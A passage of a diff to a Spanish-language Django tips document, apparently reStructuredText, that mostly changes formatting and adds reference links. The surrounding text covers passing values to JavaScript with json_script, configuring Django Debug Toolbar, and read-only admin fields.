-también con ficheros en *scripts* de javascript independientes:
+también con ficheros en *scripts* de Javascript independientes:
 
 .. code:: html
 
@@ -2305,7 +1831,7 @@ Pero esto puede ser complicado si tenemos muchos datos, o muy
 complicados. Eso nos lleva a la segunda solución.
 
 Usar ``json_script`` para valores complejos
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 Podemos pasar valores más complicados (como listas, diccionarios y, en
 general, cualquier cosa que se pueda representar en JSON) con el *tag*
@@ -2368,7 +1894,7 @@ La salida sería:
    <script id="saludos" type="application/json">{"hello": "world\\u003C/script\\u003E\\u0026amp;"}</script>
 
 Cómo configurar *Django Debug Toolbar*
---------------------------------------
+-----------------------------------------------------------------------
 
 Después de instalar el paquete con ``pip install django-debug-toolbar``,
 hay que realizar los siguientes cambios:
@@ -2395,7 +1921,7 @@ hay que realizar los siguientes cambios:
           ]
 
 Cómo hacer que un campo sea de solo lectura en el admin de Django
------------------------------------------------------------------
+-----------------------------------------------------------------------
 
 Primero hay que definir el campo con el atributo ``editable=False`` y
 luego, en el fichero ``admin.py`` definir el campo como de solo lectura,
@@ -2481,5 +2007,8 @@ Fuente: `Django unique=True except for blank values`_ - StackOverflow
 .. _Django Reset Migrations: https://simpleisbetterthancomplex.com/tutorial/2016/07/26/how-to-reset-migrations.html
 .. _Django unique=True except for blank values: https://stackoverflow.com/questions/9808202/
 .. _How to get URL of current page, including parameters: https://stackoverflow.com/questions/3248682/
+.. _inyección de código: https://es.wikipedia.org/wiki/Inyecci%C3%B3n_de_c%C3%B3digo,
 .. _natural_key: https://docs.djangoproject.com/fr/4.2/topics/serialization/#natural-keys
+.. _plantillas literales de javascript: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals
+.. _atributos de datos: https://developer.mozilla.org/en-US/docs/Learn/HTML/Howto/Use_data_attributes
 .. _Serializing Django objects: https://docs.djangoproject.com/en/4.2/topics/serialization/#natural-keys
